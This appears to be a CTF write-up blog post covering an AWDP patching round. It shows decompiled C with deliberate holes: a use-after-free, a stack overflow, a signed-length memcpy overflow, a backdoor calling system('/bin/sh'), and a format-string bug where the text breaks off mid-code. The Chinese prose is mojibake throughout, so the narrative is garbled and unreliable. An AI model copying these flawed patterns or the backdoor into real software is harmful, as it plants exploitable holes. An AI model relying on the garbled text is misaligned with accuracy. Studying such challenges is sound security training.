<p>æœ¬åœºæœ€ sb çš„é¢˜ç›®äº†ï¼Œçº¿ä¸‹æ–­ç½‘æ²¡ç¯å¢ƒï¼Œå°±å—¯çœ‹ã€‚</p>
<p>åŸºæœ¬ä¸Šéƒ½é€†å‡ºæ¥äº†ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€ç‚¹ç»“æ„æ²¡ææ¸…æ¥šï¼Œå¯¼è‡´æ ¹æœ¬è·‘ä¸äº†ã€‚</p>
<p>hard åœ¨å“ª</p>
<p>æ€»ç»“ï¼šé—¹éº»äº†ï¼Œç¬¬ä¸€å¤©è¿™ä¸‰é“é¢˜è¦æ˜¯ä¸æ–­ç½‘è®© ai åšæ„Ÿè§‰ç”¨ä¸äº†ä¸€ä¸ªå°æ—¶ï¼Œï¼Œï¼Œå¥½å¥‡ç°åœ¨ ctf å‡º vm pwn çš„éƒ½æ˜¯ä»€ä¹ˆå¿ƒç†ï¼Œå°¤å…¶æ˜¯è¿™ç§æ¯«æ— åˆ©ç”¨éš¾åº¦çš„ã€‚ã€‚ã€‚</p>
<h3 id="reverse" class="scroll-target"><a href="#reverse"><code class="hash inline-code">#</code>Reverse</a></h3>
<p>åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆä¼šåšé€†å‘ï¼Œå¤ªç™½ç»™äº†ã€‚</p>
<p>é¢˜ç›®å®ç°äº†ä¸€ä¸ª ida çš„åè°ƒï¼Œä½†æ˜¯ gdb å¯ä»¥æ­£å¸¸è°ƒã€‚è€Œé¢˜ç›®çš„æœ¬ä½“é€»è¾‘åˆå¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªå¼‚æˆ–åŠ å¯†ã€‚</p>
<p>è¾¹åƒé¥­å°±ç§’äº†ã€‚</p>
<h2 id="day2" class="scroll-target"><a href="#day2"><code class="hash inline-code">#</code>Day2</a></h2>
<h3 id="awdp-fix" class="scroll-target"><a href="#awdp-fix"><code class="hash inline-code">#</code>awdp-fix</a></h3>
<p>å››é“é¢˜ç›®ï¼Œç¬¬ä¸€é“é¢˜æ˜¯ä¸ªå †é¢˜ï¼Œç¬¬ä¸€è½®ä¸Šæ¥è‚¯å®šæ˜¯å…ˆ nop freeï¼Œäº¤äº†ä¸€å‘ä½†æ˜¯å¯„äº†</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">int</span><span style="color:#59873A"> delete</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  char</span><span style="color:#393A34"> vars0</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+0h] [rbp+0h] BYREF</span><br><span style="color:#AB5959">  void</span><span style="color:#AB5959"> *</span><span style="color:#393A34">ptr</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+8h] [rbp+8h]</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> vars10</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+10h] [rbp+10h]</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#393A34"> __int64 vars18</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+18h] [rbp+18h]</span><br><br><span style="color:#393A34">  vars18 </span><span style="color:#999999">=</span><span style="color:#59873A"> __readfsqword</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">28</span><span style="color:#AB5959">u</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  __printf_chk</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">Index: </span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">vars0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">F</span><span style="color:#AB5959">u</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">unsigned</span><span style="color:#AB5959"> int</span><span style="color:#a65e2b">)</span><span style="color:#59873A">strtol</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">vars0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Invalid index!</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959"> !</span><span style="color:#393A34">ptr </span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Chunk not allocated!</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> vars10 </span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Chunk already freed!</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  free</span><span style="color:#1e754f">(</span><span style="color:#393A34">ptr</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">  vars10 </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [1]</span><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Chunk freed!</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">int</span><span style="color:#80A665"> delete</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  char</span><span style="color:#DBD7CAEE"> vars0</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+0h] [rbp+0h] BYREF</span><br><span style="color:#CB7676">  void</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">ptr</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+8h] [rbp+8h]</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> vars10</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+10h] [rbp+10h]</span><br><span style="color:#CB7676">  unsigned</span><span style="color:#DBD7CAEE"> __int64 vars18</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+18h] [rbp+18h]</span><br><br><span style="color:#DBD7CAEE">  vars18 </span><span style="color:#666666">=</span><span style="color:#80A665"> __readfsqword</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">28</span><span style="color:#CB7676">u</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  __printf_chk</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Index: </span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">vars0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">F</span><span style="color:#CB7676">u</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">unsigned</span><span style="color:#CB7676"> int</span><span style="color:#d4976c">)</span><span style="color:#80A665">strtol</span><span style="color:#d4976c">(</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">vars0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#4D9375">    return</span><span style="color:#80A665"> puts</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Invalid index!</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676"> !</span><span style="color:#DBD7CAEE">ptr </span><span style="color:#4d9375">)</span><br><span style="color:#4D9375">    return</span><span style="color:#80A665"> puts</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Chunk not allocated!</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE"> vars10 </span><span style="color:#4d9375">)</span><br><span style="color:#4D9375">    return</span><span style="color:#80A665"> puts</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Chunk already freed!</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  free</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">ptr</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  vars10 </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [1]</span><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> puts</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Chunk freed!</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>[1] å¤„è£…æ¨¡ä½œæ ·æ¸…ç©ºäº†æŒ‡é’ˆï¼Œä½†å…¶å®ä»”ç»†çœ‹ä¸€ä¸‹æ ¹æœ¬æ²¡æœ‰ï¼Œä¿®æˆæŠŠæŒ‡é’ˆç½®ä¸º 0 å°±å¯ä»¥äº†ã€‚</p>
<p>ç¬¬äºŒé“é¢˜æ˜¯ä¸ªä¸€ä¸ªæ ˆæº¢å‡ºï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">int</span><span style="color:#393A34"> __fastcall </span><span style="color:#59873A">main</span><span style="color:#2993a3">(</span><span style="color:#AB5959">int</span><span style="color:#B07D48"> argc</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">argv</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">envp</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  _BYTE </span><span style="color:#B07D48">buf</span><span style="color:#1e754f">[</span><span style="color:#2F798A">48</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+0h] [rbp-30h] BYREF</span><br><br><span style="color:#59873A">  setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdin</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  alarm</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">78</span><span style="color:#AB5959">u</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> buf</span><span style="color:#999999">,</span><span style="color:#2F798A"> 64</span><span style="color:#AB5959">u</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [2]</span><br><span style="color:#59873A">  gorun</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> __fastcall </span><span style="color:#80A665">main</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> argc</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> **</span><span style="color:#BD976A">argv</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> **</span><span style="color:#BD976A">envp</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">  _BYTE </span><span style="color:#BD976A">buf</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">48</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+0h] [rbp-30h] BYREF</span><br><br><span style="color:#80A665">  setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdin</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  alarm</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">78</span><span style="color:#CB7676">u</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 64</span><span style="color:#CB7676">u</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [2]</span><br><span style="color:#80A665">  gorun</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>[2] å¤„æœ‰ä¸€ä¸ªå¾ˆæ˜¾ç„¶çš„æ ˆæº¢å‡ºï¼Œç›´æ¥ä¿®å¤å°±å¯ä»¥äº†ï¼Œæˆ‘å¼€èµ›äº”åˆ†é’Ÿå°±æŠŠè¿™ä¸ªäº¤äº†ï¼Œä¸ºä»€ä¹ˆæ˜¯äº”åˆ†é’Ÿå‘¢ï¼Œå› ä¸ºå‰ 4 åˆ†é’Ÿå» nop free äº†å“ˆå“ˆã€‚</p>
<p>ç¬¬ä¸‰é“é¢˜æ˜¯ä¸€ä¸ª crypto pwnï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">int</span><span style="color:#59873A"> sub_401720</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  char</span><span style="color:#B07D48"> src</span><span style="color:#1e754f">[</span><span style="color:#2F798A">256</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+0h] [rbp-250h] BYREF</span><br><span style="color:#AB5959">  char</span><span style="color:#B07D48"> s</span><span style="color:#1e754f">[</span><span style="color:#2F798A">256</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+100h] [rbp-150h] BYREF</span><br><span style="color:#393A34">  _BYTE </span><span style="color:#B07D48">dest</span><span style="color:#1e754f">[</span><span style="color:#2F798A">76</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+200h] [rbp-50h] BYREF</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> v4</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+24Ch] [rbp-4h]</span><br><br><span style="color:#59873A">  printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter Base64 encoded data: </span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  fgets</span><span style="color:#1e754f">(</span><span style="color:#393A34">s</span><span style="color:#999999">,</span><span style="color:#2F798A"> 256</span><span style="color:#999999">,</span><span style="color:#393A34"> stdin</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">  s</span><span style="color:#1e754f">[</span><span style="color:#59873A">strcspn</span><span style="color:#a65e2b">(</span><span style="color:#393A34">s</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#393A34">  v4 </span><span style="color:#999999">=</span><span style="color:#59873A"> sub_40153B</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">(</span><span style="color:#393A34">__int64</span><span style="color:#a65e2b">)</span><span style="color:#393A34">s</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">__int64</span><span style="color:#a65e2b">)</span><span style="color:#393A34">src</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [3]</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> v4 </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 64</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Invalid size</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  memcpy</span><span style="color:#1e754f">(</span><span style="color:#393A34">dest</span><span style="color:#999999">,</span><span style="color:#393A34"> src</span><span style="color:#999999">,</span><span style="color:#393A34"> v4</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [4]</span><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">have a good time!</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> sub_4016FD</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#59873A">  puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Congratulations! You got the shell!</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> system</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [5]</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">int</span><span style="color:#80A665"> sub_401720</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  char</span><span style="color:#BD976A"> src</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">256</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+0h] [rbp-250h] BYREF</span><br><span style="color:#CB7676">  char</span><span style="color:#BD976A"> s</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">256</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+100h] [rbp-150h] BYREF</span><br><span style="color:#DBD7CAEE">  _BYTE </span><span style="color:#BD976A">dest</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">76</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+200h] [rbp-50h] BYREF</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v4</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+24Ch] [rbp-4h]</span><br><br><span style="color:#80A665">  printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter Base64 encoded data: </span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  fgets</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 256</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stdin</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">  s</span><span style="color:#4d9375">[</span><span style="color:#80A665">strcspn</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  v4 </span><span style="color:#666666">=</span><span style="color:#80A665"> sub_40153B</span><span style="color:#4d9375">(</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">__int64</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">__int64</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">src</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [3]</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE"> v4 </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 64</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#4D9375">    return</span><span style="color:#80A665"> printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Invalid size</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  memcpy</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">dest</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> src</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> v4</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [4]</span><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> puts</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">have a good time!</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> sub_4016FD</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#80A665">  puts</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Congratulations! You got the shell!</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> system</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [5]</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>æŒ‰ç†è¯´è¿™é‡Œè‚¯å®šæ˜¯ <code class="inline-code">v4</code> æœ‰é—®é¢˜å¯¼è‡´ <code class="inline-code">memcpy</code> æº¢å‡ºï¼Œæˆ‘ä¸€å¼€å§‹ç›´æ¥ patch äº† v4 ä¸º 0x40ï¼Œä½†æ˜¯è¿‡ä¸äº†ã€‚</p>
<p>ç¨å¾®ç¿»äº†ä¸€ä¸‹å‡½æ•°è¡¨å‘ç°æœ‰ä¸ª backdoorï¼Œäºæ˜¯æŠŠ <code class="inline-code">system</code> patch äº†ï¼Œç„¶è€Œæ²¡æœ‰åµç”¨ï¼Œæœ‰ç‚¹æ‡µäº†ï¼Œå‘ç° <code class="inline-code">system</code> çš„å‚æ•°æ˜¯ <code class="inline-code">&quot;/bin/sh&quot;</code>ï¼Œäºæ˜¯æŠŠ <code class="inline-code">&quot;/bin/sh&quot;</code> patch äº†ï¼Œç„¶åå°±è¿‡äº†ã€‚</p>
<p>åé¢ break çš„æ—¶å€™åçŸ¥åè§‰ï¼Œ<code class="inline-code">sub_40153B</code> è¿™ä¸ªå‡½æ•°å¯ä»¥è¿”å›è´Ÿæ•°ï¼Œé‚£å°±ç›¸å½“äºæ•´æ•°æº¢å‡ºäº†ã€‚</p>
<p>æœ€åä¸€ä¸ªé¢˜æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#393A34">__int64 __fastcall </span><span style="color:#59873A">sub_2567</span><span style="color:#2993a3">(</span><span style="color:#AB5959">const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> *</span><span style="color:#B07D48">a1</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> *</span><span style="color:#B07D48">a2</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959"> !</span><span style="color:#59873A">strcmp</span><span style="color:#a65e2b">(</span><span style="color:#393A34">a1</span><span style="color:#999999">,</span><span style="color:#393A34"> a2</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><span style="color:#A0ADA0">  // [6]</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">    puts</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Captcha correct!</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Welcome:</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    read</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> buf</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#AB5959">u</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Your greeting:</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    puts</span><span style="color:#a65e2b">(</span><span 